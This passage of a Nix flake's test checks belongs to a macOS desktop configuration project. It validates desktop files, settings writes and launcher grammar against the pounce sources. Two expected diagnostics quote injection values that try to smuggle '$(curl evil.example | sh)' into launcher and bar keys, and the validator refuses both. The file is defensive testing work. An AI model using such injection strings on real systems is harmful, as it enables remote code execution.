                  bar = blankConfig.haus.bar.enable;
                  themePorts = blankConfig.haus.theme.ports.enable;
                  tour = blankConfig.haus.tour.enable;
                  wallpaper = blankConfig.haus.wallpaper.style != "none";
                  windows = blankConfig.haus.windows.enable;
                }
                .${name}
              )
              [
                "ai"
                "apps"
                "bar"
                "security"
                "development"
                "focus"
                "launcher"
                "shelf"
                "themePorts"
                "tour"
                "wallpaper"
                "windows"
              ];

          desktopProjection = import ./test/desktop-projection.nix {
            inherit pkgs;
            lib = nixpkgs.lib;
          };
          exampleProjection = builtins.toJSON (
            desktopProjection.project self.darwinConfigurations.example.config
          );

          # ---- settings-writes -------------------------------------------------
          # §5.6's ten curated macOS settings groups share one policy — every
          # leaf defaults to "write nothing", because a `defaults` write is
          # one-way and going back stops writing rather than restoring. The
          # policy is stated over DECLARATIONS, and every surface that could
          # show it (the option's default, the generated reference, `haus
          # show`) reads the declaration and is right. None of them holds the
          # product: what a machine running this desktop actually WRITES.
          #
          # `test/settings-writes.nix` resolves all 66 leaves on each shipping
          # desktop and reports the ones that come out non-quiet, tagged by who
          # supplied the value. `desktop:` is the ordinary case and needs no
          # argument — naming settings is what a desktop is for. `room:` is the
          # one the policy never addressed: a module reached by some unrelated
          # `enable` deciding a macOS setting on a machine that asked it
          # nothing. Every `room:` row below had to be argued for, and the
          # argument belongs in the comment beside it, not in a re-blessed
          # snapshot.
          settingsWrites = import ./test/settings-writes.nix {
            lib = nixpkgs.lib;
            root = ./.;
            registry = import ./modules/options-groups.nix;
          };
          settingsWriteRows = builtins.concatMap (
            name:
            let
              s = mkHaus {
                inherit system;
                username = "you";
                hostname = "example";
                desktop = desktopFiles.${name};
              };
            in
            settingsWrites.rows {
              inherit name;
              inherit (s) config options;
            }
          ) (builtins.attrNames desktopFiles);
          settingsWriteTable = builtins.concatStringsSep "\n" settingsWriteRows;

          # Two rows, one leaf, no desktop among them — and that is the finding
          # this table was built to keep visible, not an incidental shape.
          #
          # NOT ONE of the four shipping desktops names a single one of the 66
          # leaves. The whole curated surface — hot corners, the clock, sound,
          # locale, power, the firewall, animations, Stage Manager — is offered
          # and unexercised by the product, exactly as §5.6 intended ("a place
          # to make an opinion available, not to impose one"). So every row
          # this check will ever gain starts life as a `room:` row, which is
          # the class the policy was never addressed to.
          #
          # The two that exist: `haus.shelf.watchScreenshots` (haus#461, on by
          # default) sets `haus.screenshots.thumbnail = mkDefault false`,
          # because a capture macOS is still holding for its five-second
          # floating thumbnail cannot reach the shelf. `hacker` and `everyday`
          # run the shelf; `blank` and `minimal` do not. Argued and accepted:
          # the write is scoped to a room the user switched on, the option's
          # own description says the shelf does it, and naming the leaf in a
          # host outranks the `mkDefault` and puts the thumbnail back.
          #
          # Adding a row here is a decision, not a formality. It means some
          # room has started writing a macOS key on machines that asked it
          # nothing, and going back will not restore what it overwrote.
          expectedSettingsWriteTable = ''
            everyday haus.screenshots.thumbnail = false room:modules/shelf
            hacker haus.screenshots.thumbnail = false room:modules/shelf
          '';

          # The OTHER entry point, and the one this step could most easily have
          # broken: a standalone export selects no desktop and must keep
          # evaluating exactly that way — the bare foundation plus one room,
          # with none of hacker's opinions and nothing to select.
          desktopStandalone = desktopSelection (standaloneSystem [ self.darwinModules.bar ]).config;

          # Two desktops. Not a type error and not a conflict — both files are
          # valid, and the module system would happily merge them — so the
          # refusal has to be an assertion, and it has to name both files or it
          # tells you nothing you can act on.
          desktopTwoAssertions = map (a: desktopHere a.message) (
            builtins.filter (a: !a.assertion)
              (desktopConfig {
                desktop = desktopFixture "valid-sample.nix";
                extraModules = [ (riceLib.desktop (desktopFixture "valid-other.nix")) ];
              }).assertions
          );
          expectedDesktopTwoAssertions = [
            (
              "This machine selected 2 desktops:\n"
              + "  test/desktops/valid-other.nix\n"
              + "  test/desktops/valid-sample.nix\n"
              + "A host runs exactly one. Whole desktops do not stack — pick the one that "
              + "answers what this Mac should feel like, and say the rest in your host file, "
              + "which wins over the desktop by plain assignment. To select one through "
              + "`extraModules` instead of the builder's own `desktop` argument, pass "
              + "`desktop = null` alongside it."
            )
          ];

          # Repeating the same file is still one desktop. `lib.unique` in the
          # assertion seam makes this harmless rather than reporting the same
          # source twice as if two different desktops had been composed.
          desktopSameAssertions = map (a: desktopHere a.message) (
            builtins.filter (a: !a.assertion)
              (desktopConfig {
                desktop = desktopFixture "valid-sample.nix";
                extraModules = [ (riceLib.desktop (desktopFixture "valid-sample.nix")) ];
              }).assertions
          );
          expectedDesktopSameAssertions = [
            (
              "This machine selected the same desktop more than once:\n"
              + "  test/desktops/valid-sample.nix\n"
              + "Import it once. Repeating a desktop can duplicate list-valued settings even "
              + "when its scalar values are identical."
            )
          ];

          # Every way a file fails to be a desktop, with the diagnostic it
          # produces. One fixture per rule (test/desktops/README.md); the list is
          # read off the directory, so a rule added with no fixture — or a
          # fixture added with no expected message — shows up here as a diff.
          desktopDiagnostics = builtins.concatStringsSep "\n" (
            nixpkgs.lib.concatMap (
              name: map desktopHere (riceLib.desktopFailures (desktopFixture name))
            ) desktopBadNames
          );
          expectedDesktopDiagnostics = ''
            test/desktops/activation.nix: may not set `system.*` (activation scripts, macOS defaults nothing declares) — those are a host's, or a room's
            test/desktops/dynamic-host-only.nix: haus.roster.<name>.package is host-only, so a shared desktop may not set it. It takes a `pkgs` value, and desktop data is evaluated with no module arguments to take one from. The `…Name` leaf beside it is the desktop-safe half of the pair.
            test/desktops/dynamic-unknown.nix: haus.roster.<name>.postInstall is not a haus option
            test/desktops/extra-key.nix: may not set `environment.*` — installing something is a room's job, and `haus.roster` is how a desktop asks for one
            test/desktops/file-attr.nix: may not claim another file's name
            test/desktops/function.nix: is a function, so it is not a desktop. A desktop takes no arguments — no pkgs, no lib, no config — and evaluates to { haus = { … }; }. Something that genuinely needs pkgs is a room, with the trust that implies.
            test/desktops/group-not-option.nix: haus.theme is a group of options, not an option — name one of the settings under it
            test/desktops/home-manager.nix: may not set `home-manager.*` — a desktop configures rooms, and rooms configure home
            test/desktops/host-only-command.nix: haus.keys.leaderExtras.*.command is host-only, so a shared desktop may not set it. It is a shell command this machine runs, and a desktop is a file you can read to know what it does. A leaf carrying a command is exactly what stops that being true.
            test/desktops/host-only-hardware.nix: haus.displays.37D8832A-2D66-02CA-B9F7-8F30A301B230 names a physical display, which is a fact about one machine — a desktop may only use the `internal` and `main` selectors
            test/desktops/host-only-identity.nix: haus.git.email is host-only, so a shared desktop may not set it. It names you rather than a machine: your commit identity, the addresses that are yours, the account whose repositories this Mac works on. A desktop that set it would put its author's details on your work.
            test/desktops/host-only-package.nix: haus.fonts.mono.package is host-only, so a shared desktop may not set it. It takes a `pkgs` value, and desktop data is evaluated with no module arguments to take one from. The `…Name` leaf beside it is the desktop-safe half of the pair.
            test/desktops/host-only-path.nix: haus.terminal.obsidianVaults is host-only, so a shared desktop may not set it. It names a path on this disk, so it is a fact about one filesystem rather than an opinion a shared desktop can hold about every machine.
            test/desktops/host-only-secret.nix: haus.focus.slack.tokenCommand is host-only, so a shared desktop may not set it. It points at a secret, or at the store this machine keeps its secrets in, so it belongs to one person on one Mac.
            test/desktops/host-only-secret.nix: haus.secrets.provider is host-only, so a shared desktop may not set it. It points at a secret, or at the store this machine keeps its secrets in, so it belongs to one person on one Mac.
            test/desktops/host-only-signing.nix: haus.launcher.signingIdentity is host-only, so a shared desktop may not set it. It names a code-signing identity in one login keychain, which exists on exactly one Mac and cannot be meaningfully published.
            test/desktops/host-only-widget-command.nix: haus.bar.widgets.<name>.command is host-only, so a shared desktop may not set it. It is a shell command this machine runs, and a desktop is a file you can read to know what it does. A leaf carrying a command is exactly what stops that being true.
            test/desktops/imports.nix: may not import modules — a desktop is one file's worth of values, and what it can reach has to be readable from that file alone
            test/desktops/internal-wiring.nix: haus._contrib is internal wiring between rooms, not a setting a desktop may write
            test/desktops/launcher-item-key.nix: haus.launcher.items.filesearch is not an item key (expected cmd:<id>, app:<path>, setting:<pane>[?<anchor>] or mode:<name>)
            test/desktops/launcher-item-shell.nix: haus.launcher.items.mode:"; $(curl evil.example | sh); " may not contain quotes, backslashes, `$`, backticks, newlines or tabs
            test/desktops/launcher-item-shortcut.nix: haus.launcher.items.shortcut:0ECC8F7A-3A52-467A-84C0-511CCE1CB9B7 names one entry in one Mac's Shortcuts library, which is a fact about that machine rather than a taste a desktop can share
            test/desktops/missing-haus.nix: has no `haus` settings — a desktop is { haus = { … }; }
            test/desktops/module-internals.nix: may not set module-system internals
            test/desktops/nixpkgs.nix: may not set `nixpkgs.*`
            test/desktops/non-attrset.nix: does not evaluate to a set of settings — a desktop is { haus = { … }; }
            test/desktops/priority-instruction.nix: haus.ui.scale may not carry a merge or priority instruction — a desktop states values, and the host is what outranks them
            test/desktops/reserved-prefix.nix: haus.my names a private room, and a desktop is a file other people run. `haus.my.*` is reserved for rooms that live on one Mac and nowhere else, so nothing shared may name one — publish the room and it claims a plain `haus.<name>` like any other.
            test/desktops/scene-name.nix: haus.focus.scenes.deep work is not a plain scene name
            test/desktops/shell-in-free-key.nix: haus.bar.media.icons.Music"; $(curl evil.example | sh); " may not contain quotes, backslashes, `$`, backticks, newlines or tabs
            test/desktops/stray-key.nix: sets `launchd` outside `haus`, and a desktop may set nothing else
            test/desktops/unknown-option.nix: haus.theme.accentColour is not a haus option
          '';

          # ---- desktop-show ----------------------------------------------------
          # `haus show`'s reading of every fixture in that same directory — the
          # data half, which is all of it that can run in a Nix build (the script
          # shells out to `nix eval`, so its own suite is test/haus-show.sh, run
          # from CI where a nix IS available).
          #
          # One line per fixture, read off the directory like the diagnostics
          # above, so a rule that gains a fixture gains a row here too. What it
          # pins is the CLASSIFICATION and the shape of the summary, which is
          # exactly what the command's trust story rests on: `class=desktop`
          # with `ok=false` is a file that was CHECKED and refused, and
          # `class=room` is a file nothing was checked about at all. Those two
          # must never be confusable, and a fixture drifting from one to the
          # other is the single most dangerous silent change this command has.
          desktopShowTable = builtins.concatStringsSep "\n" (
            map (
              name:
              let
                r = riceLib.showDesktop (desktopFixture name);
              in
              "${name} class=${r.class} ok=${nixpkgs.lib.boolToString r.ok} "
              + "sets=${toString (builtins.length r.sets)} "
              + "rooms=${
                if r.rooms == [ ] then "-" else builtins.concatStringsSep "+" (map (x: x.room) r.rooms)
              } "
              + "silent=${toString (builtins.length r.silent)}"
            ) desktopFixtures
          );
          expectedDesktopShowTable = ''
            activation.nix class=desktop ok=false sets=1 rooms=haus silent=12
            dynamic-host-only.nix class=desktop ok=false sets=1 rooms=haus silent=12
            dynamic-unknown.nix class=desktop ok=false sets=1 rooms=haus silent=12
            extra-key.nix class=desktop ok=false sets=1 rooms=haus silent=12
            file-attr.nix class=desktop ok=false sets=1 rooms=haus silent=12
            function.nix class=room ok=true sets=0 rooms=- silent=0
            group-not-option.nix class=desktop ok=false sets=1 rooms=appearance silent=11
            home-manager.nix class=desktop ok=false sets=1 rooms=haus silent=12
            host-only-command.nix class=desktop ok=false sets=1 rooms=haus silent=12
            host-only-hardware.nix class=desktop ok=false sets=1 rooms=displays silent=11
            host-only-identity.nix class=desktop ok=false sets=1 rooms=host silent=12
            host-only-package.nix class=desktop ok=false sets=1 rooms=appearance silent=11
            host-only-path.nix class=desktop ok=false sets=1 rooms=development silent=11
            host-only-secret.nix class=desktop ok=false sets=2 rooms=focus+security silent=10
            host-only-signing.nix class=desktop ok=false sets=1 rooms=launcher silent=11
            host-only-widget-command.nix class=desktop ok=false sets=2 rooms=bar silent=11
            imports.nix class=desktop ok=false sets=1 rooms=haus silent=12
            internal-wiring.nix class=desktop ok=false sets=1 rooms=- silent=12
            launcher-item-key.nix class=desktop ok=false sets=1 rooms=launcher silent=11
            launcher-item-shell.nix class=desktop ok=false sets=1 rooms=launcher silent=11
            launcher-item-shortcut.nix class=desktop ok=false sets=1 rooms=launcher silent=11
            missing-haus.nix class=desktop ok=false sets=0 rooms=- silent=12
            module-internals.nix class=desktop ok=false sets=1 rooms=haus silent=12
            nixpkgs.nix class=desktop ok=false sets=1 rooms=haus silent=12
            non-attrset.nix class=desktop ok=false sets=0 rooms=- silent=12
            priority-instruction.nix class=desktop ok=false sets=1 rooms=haus silent=12
            reserved-prefix.nix class=desktop ok=false sets=1 rooms=- silent=12
            scene-name.nix class=desktop ok=false sets=1 rooms=focus silent=11
            shell-in-free-key.nix class=desktop ok=false sets=1 rooms=bar silent=11
            stray-key.nix class=desktop ok=false sets=1 rooms=haus silent=12
            unknown-option.nix class=desktop ok=false sets=1 rooms=appearance silent=11
            valid-other.nix class=desktop ok=true sets=1 rooms=haus silent=12
            valid-sample.nix class=desktop ok=true sets=10 rooms=displays+development+bar+launcher+focus+haus silent=7
          '';

          # And one fixture read in full, because the table above says nothing
          # about the part a publisher actually reads: which room each leaf was
          # filed under, and what the value looked like on its way to the
          # terminal. A leaf whose namespace moves between rooms shows up here.
          desktopShowSample = builtins.concatStringsSep "\n" (
            map (s: "${if s.room == null then "(none)" else s.room}  ${s.path} = ${s.value}") (
              (riceLib.showDesktop (desktopFixture "valid-sample.nix")).sets
            )
          );
          expectedDesktopShowSample = ''
            bar  haus.bar.enable = true
            bar  haus.bar.widgets.cpu.enable = true
            bar  haus.bar.widgets.cpu.interval = 10
            displays  haus.displays.internal.uiScale = "larger-text"
            focus  haus.focus.scenes.presenting.description = "no interruptions, no screensaver"
            focus  haus.focus.scenes.presenting.preventSleep = true
            launcher  haus.launcher.autoQuit.exclude = [ "from-desktop-a" "from-desktop-b" ]
            launcher  haus.launcher.items.mode:filesearch.alias = "ff"
            development  haus.terminal.editorName = "neovim"
            haus  haus.ui.scale = 1.35
          '';

          # And the throwing half of the same seam: `checkDesktop` is what
          # `lib.desktop` asserts on, so a bad desktop has to stop the
          # evaluation rather than merely being listed somewhere.
          desktopSlippedThrough = builtins.filter (
            name: (builtins.tryEval (riceLib.checkDesktop (desktopFixture name))).success
          ) desktopBadNames;
          desktopWronglyRefused = builtins.filter (
            name: !(builtins.tryEval (riceLib.checkDesktop (desktopFixture name))).success
          ) desktopValidNames;
          # ---- login-note ------------------------------------------------------
          # The third table's own check, and the only one of the three that can't
          # be enforced by construction the way the other two are.
          #
          # modules/lib/login-map.nix already fails at eval in both directions
          # against modules/lib/restart-map.nix — a domain that becomes `logout`
          # with no paragraph, or a paragraph for a domain that isn't `logout`
          # any more. What that CAN'T see is the step after it: whether the
          # options actually backed by a logout-only domain interpolate the
          # paragraph at all. Nothing forces them to. `mkLoginWindow` and
          # `mkWindowManagerOption` do it for every option built through them,
          # but an option added beside those helpers, by hand, would type-check,
          # write the plist, and say nothing about the wait — which is precisely
          # the silent settings group §5.6 refused for a year, reintroduced one
          # option at a time.
          #
          # So this reads the EVALUATED option tree — descriptions as a person
          # will see them in the reference, not the source that produced them —
          # and requires the note's own sentence in every leaf under the four
          # namespaces those two domains back. Reading the rendered description
          # is the point: it passes whether the prose arrives through a helper,
          # an interpolation or a future third route, and fails only on the thing
          # that matters, which is a person meeting the option and not being told.
          loginNoteNamespaces = [
            [
              "lock"
              "login"
            ]
            [
              "security"
              "guestAccount"
            ]
            [
              "windows"
              "stageManager"
            ]
            [
              "windows"
              "nativeTiling"
            ]
            [
              "windows"
              "desktop"
            ]
          ];
          # One short phrase common to both domains' paragraphs, rather than a
          # whole one: a substring long enough to be unmistakable and short
          # enough that editing either note's wording doesn't turn this check
          # into a spelling test. If the phrase itself is ever reworded, the two
          # assertions below say so rather than silently matching nothing.
          loginNotePhrase = "TAKES EFFECT AT YOUR NEXT LOGIN";
          loginNoteOptions =
            let
              opts =
                (mkHaus {
                  inherit system;
                  username = "you";
                  hostname = "example";
                }).options.haus;
              # Walk to a leaf: an option set has `_type == "option"`, anything
              # else with attrs is a namespace to descend into.
              leaves =
                path: node:
                if !(builtins.isAttrs node) then
                  [ ]
                else if node._type or null == "option" then
                  [
                    {
                      inherit path;
                      description = node.description or "";
                    }
                  ]
                else
                  nixpkgs.lib.concatLists (
                    nixpkgs.lib.mapAttrsToList (n: v: leaves (path ++ [ n ]) v) (removeAttrs node [ "_module" ])
                  );
            in
            nixpkgs.lib.concatMap (ns: leaves ns (nixpkgs.lib.getAttrFromPath ns opts)) loginNoteNamespaces;
          loginNoteMissing = map (o: nixpkgs.lib.concatStringsSep "." ([ "haus" ] ++ o.path)) (
            builtins.filter (
              o: !(nixpkgs.lib.hasInfix loginNotePhrase (toString o.description))
            ) loginNoteOptions
          );
          # The userstyles-inline fixture. The `@import` sits where every real
          # one does — first statement inside the `@-moz-document` block, which
          # is exactly the position that makes it invalid.
          userstylesInlineIn = ''
            @-moz-document domain("example.com") {
              @import url("https://example.invalid/hl.css");
              :root { --bg: #202020; }
            }
          '';
          userstylesInlineOut = ''
            @-moz-document domain("example.com") {
              /* inlined from https://example.invalid/hl.css */
            .hljs { color: red; }
              :root { --bg: #202020; }
            }
          '';
          # The userstyles-important fixture, in and out. Held here rather than
          # inline in the check so the two read side by side — the point of the
          # test is the DIFF between them, and three of the eight lines are
          # supposed to come back unchanged.
          userstylesImportantIn = ''
            @-moz-document domain("example.com") {
              @import url("https://a/b.css");
              :root {
                --bg: #202020;
                content: "a;b}c";
                background: url(a;b.png);
                width: 3px !important;
              }
              @keyframes spin { from { opacity: 0; } }
              @font-face { font-family: X; src: url(y); }
              @media (prefers-color-scheme: dark) { .a { color: red; } }
            }
          '';
          userstylesImportantOut = ''
            @-moz-document domain("example.com") {
              @import url("https://a/b.css");
              :root {
                --bg: #202020 !important;
                content: "a;b}c" !important;
                background: url(a;b.png) !important;
                width: 3px !important;
              }
              @keyframes spin { from { opacity: 0; } }
              @font-face { font-family: X; src: url(y); }
              @media (prefers-color-scheme: dark) { .a { color: red !important; } }
            }
          '';
        in
        {
          room-registry = pkgs.runCommand "haus-room-registry-ok" { } ''
            ${nixpkgs.lib.optionalString (registryFailures != [ ]) ''
              cat >&2 <<'FAILURES'
              ${builtins.concatStringsSep "\n" registryFailures}
              FAILURES
              exit 1''}
            touch $out
          '';

          data-only-surface = pkgs.runCommand "haus-data-only-surface-ok" { } ''
            ${nixpkgs.lib.optionalString (unnamedPackageOptions != [ ]) ''
              cat >&2 <<'OFFENDERS'
              These options take a package, so a data-only desktop cannot set them —
              reaching `pkgs` is exactly what that format forbids:

              ${builtins.concatStringsSep "\n" unnamedPackageOptions}

              Give each one a string sibling named <option>Name, resolved through
              modules/lib/pkg-by-name.nix (see haus.roster.<name>.packageName
              for the shape). Keep the package-typed option too — it stays the
              precise way to say it from a module that has `pkgs`.
              OFFENDERS
              exit 1''}
            touch $out
          '';

          # modules/launcher/item-grammar.nix is a copy of pounce's `ItemTarget`,
          # and copies rot. This one rotted in the expensive direction: pounce
          # learned `shortcut:<uuid>` (pounce#80), the LOCK moved to it the same
          # day, and the layer went on asserting that a key its own daemon
          # accepts "is not an item key" — a user's build failing over a valid
          # key, with the error naming the user.
          #
          # So this reads the pounce the lock actually pins, not pounce's main:
          # the question is never "what does pounce do now", it is "does the
          # grammar we validate against match the binary we install". A lock
          # bump is mechanical and this mirror is prose, which is exactly the
          # asymmetry that let it drift for a day without anyone noticing.
          pounce-item-grammar =
            let
              grammar = import ./modules/launcher/item-grammar.nix;
            in
            pkgs.runCommand "haus-pounce-item-grammar-ok" { } ''
              src=${pounce}/pkgs/pounce/ItemSettings.swift
              test -f "$src" || {
                echo "pounce's ItemSettings.swift has moved — find ItemTarget and repoint" >&2
                echo "this check. Do not delete it: modules/launcher/item-grammar.nix is a" >&2
                echo "copy of that enum, and this is the only thing that reads both." >&2
                exit 1
              }

              # Every extraction ends in `|| true`: the builder runs `set -e -o
              # pipefail`, so a pattern that stops matching would abort the build
              # here and the guard below — the part that says DON'T DELETE THIS
              # CHECK — would never print. An empty file is what makes it speak.

              # `static let modes = ["launcher", "clipboard", …]` → one per line.
              sed -n 's/.*static let modes = \[\(.*\)\].*/\1/p' "$src" \
                | tr -d ' "' | tr ',' '\n' | grep . > theirs-modes || true
              # The fallback text of ItemTarget.problem. That literal is built by
              # CONCATENATION in Swift and wraps across lines once it grew a
              # fourth shape, so the source is flattened first: join every line,
              # then delete each `" + "` seam, leaving one string to grep. Doing
              # it on the raw file is how this check broke when pounce added
              # `setting:` — the closing paren moved into the next literal, the
              # pattern matched nothing, and the guard below fired instead of
              # the diff that would have named the missing shape.
              tr '\n' ' ' < "$src" | sed 's/" *+ *"//g' > flat
              # The `mode:` error also starts "(expected", but its literal has
              # no closing paren before the quote, so this pattern takes only
              # the shape list.
              grep -o '(expected [^"]*)' flat > theirs-shapes || true
              # …and the parser itself, because the line above mirrors pounce's
              # ERROR TEXT, which is a hand-written literal beside `parse` rather
              # than something derived from it. A prefix added to `parse` and left
              # out of that string would leave both this repo and pounce's own
              # message wrong, agreeing with each other — this repo's exact bug,
              # recurring green. `sort -u` because `problem` tests "mode:" again.
              grep -o 'hasPrefix("[a-z]*:")' "$src" \
                | sed 's/.*("\(.*\)")/\1/' | sort -u > theirs-prefixes || true

              test -s theirs-modes && test -s theirs-shapes && test -s theirs-prefixes || {
                echo "found ItemSettings.swift but not ItemTarget's modes/error text/parse —" >&2
                echo "the shapes this check greps for are gone. Restore them, or replace" >&2
                echo "this check with whatever keeps modules/launcher/item-grammar.nix in" >&2
                echo "step with the locked pounce — do not simply delete it." >&2
                exit 1
              }

              diff -u ${pkgs.writeText "ours-modes" (builtins.concatStringsSep "\n" grammar.modes + "\n")} \
                      theirs-modes \
                || { echo >&2; echo "left: modules/launcher/item-grammar.nix's \`modes\` · right: ItemTarget.modes in the locked pounce" >&2; exit 1; }

              diff -u ${pkgs.writeText "ours-shapes" (grammar.expectedText + "\n")} \
                      theirs-shapes \
                || { echo >&2; echo "left: item-grammar.nix's \`shapes\` · right: ItemTarget.problem's text in the locked pounce — a prefix was added or renamed" >&2; exit 1; }

              diff -u ${
                pkgs.writeText "ours-prefixes" (
                  builtins.concatStringsSep "\n" (builtins.sort (a: b: a < b) grammar.prefixes) + "\n"
                )
              } \
                      theirs-prefixes \
                || { echo >&2; echo "left: item-grammar.nix's \`shapes\`, as prefixes · right: what ItemTarget.parse in the locked pounce actually accepts" >&2; exit 1; }

              touch $out
            '';

          # Every `# pounce: <key> =` this rice's own command scripts use, checked
          # against the parser the DAEMON builds the launcher from. That is
          # CommandRegistry.swift and not the bash `pounce-palette`, which is the
          # distinction this check exists to hold: ⌘Space has been in-process
          # since the daemon took the hotkey, so a key implemented in the shell
          # launcher alone is a key that never fires on the only path anyone uses
          # — and a header key pounce does not know is ignored in SILENCE, which
          # is the same failure `pounce-item-grammar` was written for one layer
          # over. `cheat`/`cheatWhen` are ours on purpose: pounce ignores them and
          # the cheatsheet renderer in modules/launcher reads them.
          pounce-command-keys =
            let
              # From the parser that reads them, not a second copy: these two are
              # "ours" precisely because ./modules/launcher/header-grammar.nix is
              # the only thing in either repo that looks for them.
              hausOwn = (import ./modules/launcher/header-grammar.nix).hausOwnKeys;
            in
            pkgs.runCommand "haus-pounce-command-keys-ok" { } ''
              src=${pounce}/pkgs/pounce/CommandRegistry.swift
              test -f "$src" || {
                echo "pounce CommandRegistry.swift has moved — find the header parser" >&2
                echo "the daemon uses and repoint this check. Do not delete it: a" >&2
                echo 'header key pounce does not know is ignored with no error at all.' >&2
                exit 1
              }

              # `[A-Za-z0-9_-]`, not `[A-Za-z]`: a key the pattern cannot match is
              # not compared at all, and this check passing vacuously on
              # `when-file` would be the silent-ignore bug it exists to catch,
              # wearing the check's own green.
              #
              # The whitespace class has to track ./modules/launcher/header-grammar.nix
              # for the same reason, and that is the sharper version of the trap:
              # this grep is a FOURTH parser of the grammar, and the narrowest one
              # loses silently. While the reader accepted an indented header and
              # this pattern did not, a key we ignore could sit in a command and
              # never reach the comparison at all — the check would go green
              # because it could not see the thing it is looking for.
              # `[[:blank:]]` is space-and-tab exactly, and needs no literal tab and
              # no doubled single quotes — which a Nix indented string reads as its
              # own escape character, killing the parse from inside a COMMENT.
              grep -hoE '^[[:blank:]]*#[[:blank:]]+pounce:[[:blank:]]*[A-Za-z0-9_-]+[[:blank:]]*=' \
                ${./modules/launcher/commands}/*.sh \
                | sed -E 's/^[[:blank:]]*#[[:blank:]]+pounce:[[:blank:]]*//; s/[[:blank:]]*=$//' \
                | sort -u > ours || true
              grep -o 'field(value, "[A-Za-z]*")' "$src" \
                | sed 's/.*"\([A-Za-z]*\)".*/\1/' | sort -u > theirs || true

              test -s ours && test -s theirs || {
                echo 'found CommandRegistry.swift but not its field(value, "…") header' >&2
                echo 'parser (or no "# pounce:" headers here at all) — restore the shape' >&2
                echo 'this check greps for rather than deleting the check.' >&2
                exit 1
              }

              cat theirs ${
                pkgs.writeText "haus-own-header-keys" (builtins.concatStringsSep "\n" hausOwn + "\n")
              } | sort -u > known
              comm -23 ours known > unknown
              test -s unknown && {
                echo 'these "# pounce:" header keys are used by modules/launcher/commands' >&2
                echo "but the locked pounce's CommandRegistry does not parse them, so the" >&2
                echo "daemon ignores them on every summon:" >&2
                sed 's/^/  /' unknown >&2
                echo "Bump the pounce input, fix the spelling, or add the key to hausOwn" >&2
                echo "in this check if it is deliberately ours." >&2
                exit 1
              }
              touch $out
            '';

          # Tolerance in OUR reader is not a licence to use it in OUR commands.
          # modules/launcher/header-grammar.nix accepts an indented header, a tab
          # after the `#`, `pounce:name` and so on, because a user hand-writing a
          # command in their own dir should not lose a row to a stray space. But
          # this layer WRITES the headers in modules/launcher/commands and pounce
          # reads them, and the pounce we are locked against is narrower than we
          # now are: pre-#95 its Swift parser wants `#` + exactly one space and
          # its awk wants that anchored. A header we accept and it doesn't isn't
          # a near miss — the daemon drops the whole line, so the row falls back
          # to its filename, loses its description, and never sees `whenFile`,
          # which lists a gated row (Pages) unconditionally.
          #
          # So: our own headers stay canonical, whatever the reader tolerates.
          # The wide pattern finds every line that MEANS to be a header; the
          # narrow one is the spelling every parser in both repos agrees on. A
          # line in the first and not the second is the bug.
          pounce-command-headers = pkgs.runCommand "haus-pounce-command-headers-ok" { } ''
            # No `cd` into the source — it is a read-only store path, and these
            # scratch files have to land in the build dir.
            cmds=${./modules/launcher/commands}
            grep -hoE '^[[:blank:]]*#[[:blank:]]+pounce:[[:blank:]]*[A-Za-z0-9_-]+[[:blank:]]*=' \
              "$cmds"/*.sh | sort -u > wide || true
            grep -hoE '^# pounce: [A-Za-z0-9_-]+ =' "$cmds"/*.sh | sort -u > narrow || true

            test -s wide || {
              echo 'no "# pounce:" headers found in modules/launcher/commands at all —' >&2
              echo 'the pattern has gone stale. Repoint it rather than deleting the' >&2
              echo 'check: it is the only thing keeping our headers portable.' >&2
              exit 1
            }

            comm -23 wide narrow > loose
            test -s loose && {
              echo 'these header lines are legal for our own reader and are NOT' >&2
              echo 'canonical, so the locked pounce ignores them outright — the row' >&2
              echo 'loses its name, its description and its whenFile, silently:' >&2
              sed 's/^/  /' loose >&2
              echo >&2
              echo 'Write them as "# pounce: <key> = <value>", one space each side.' >&2
              echo 'The tolerance in header-grammar.nix is for headers our USERS' >&2
              echo 'type, not for the ones we ship.' >&2
              exit 1
            }
            touch $out
          '';

          state-files = pkgs.runCommand "haus-state-files-ok" { } ''
            mods=${./modules}
            fail=0

            # Half one: every file that spells a shared name still spells it.
            # `grep -q` on a path that does not exist is an ERROR, not a miss,
            # so the existence test is separate — otherwise a moved file reads
            # as a passing check instead of a broken one, which is how this
            # class of check goes blind rather than red.
${builtins.concatStringsSep "\n" (
              builtins.concatMap (
                f:
                map (rel: ''
                  if [ ! -f "$mods/${nixpkgs.lib.removePrefix "modules/" rel}" ]; then
                    echo '${rel} is listed in modules/lib/state-files.nix under' >&2
                    echo '`${f.key}` and does not exist. Repoint the entry — do not' >&2
                    echo 'drop it: an unlisted file is one nothing checks.' >&2
                    fail=1
                  else
                    grep -qF -- '${f.name}' "$mods/${nixpkgs.lib.removePrefix "modules/" rel}" || {
                      echo '${rel} no longer mentions `${f.name}`, which it shares with' >&2
                      echo 'the other side of `${f.key}` in modules/lib/state-files.nix.' >&2
                      echo 'If you renamed the file, rename it in every `literals` entry' >&2
                      echo 'and here — one side alone is silent in both directions.' >&2
                      fail=1
                    }
                    grep -qF -- '${f.dir}' "$mods/${nixpkgs.lib.removePrefix "modules/" rel}" || {
                      echo '${rel} no longer mentions `${f.dir}`, the directory every' >&2
                      echo 'shared haus state file lives in.' >&2
                      fail=1
                    }
                  fi
                '') f.literals
              ) stateFileEntries
            )}

            # Half two: no .nix under modules/ may hand-spell a registered path.
            # Without this the registry is just a sixth copy — the exact shape
            # it exists to end. A room that needs one of these paths imports
            # ../lib/state-files.nix and interpolates it.
${builtins.concatStringsSep "\n" (
              map (f: ''
                stray=$(grep -rlnF --include='*.nix' -- '${f.dir}/${f.name}' "$mods" || true)
                if [ -n "$stray" ]; then
                  echo 'these .nix files hand-spell `${f.dir}/${f.name}`, which' >&2
                  echo 'modules/lib/state-files.nix owns as `${f.key}`:' >&2
                  echo "$stray" | sed 's|^|  |' >&2
                  echo 'Import ../lib/state-files.nix and interpolate .dir/.name instead.' >&2
                  fail=1
                fi
              '') stateFileEntries
            )}

            [ "$fail" = 0 ] || exit 1
            touch $out
          '';

          pounce-header-grammar = pkgs.runCommand "haus-pounce-header-grammar-ok" { } ''
            diff -u ${pkgs.writeText "expected" expectedHeaderGrammarTable} \
                    ${pkgs.writeText "actual" (headerGrammarTable + "\n")} || {
              echo >&2
              echo "modules/launcher/header-grammar.nix parses these differently now." >&2
              echo "It is the ONLY reader of cheat/cheatWhen, so a miss shows up as" >&2
              echo "a wrong word in the cheatsheet and in no log at all." >&2
              echo "pounce holds the same cases under the same names in" >&2
              echo "pkgs/pounce/tests/fixtures/header-grammar/ — change both, or neither." >&2
              exit 1
            }
            touch $out
          '';

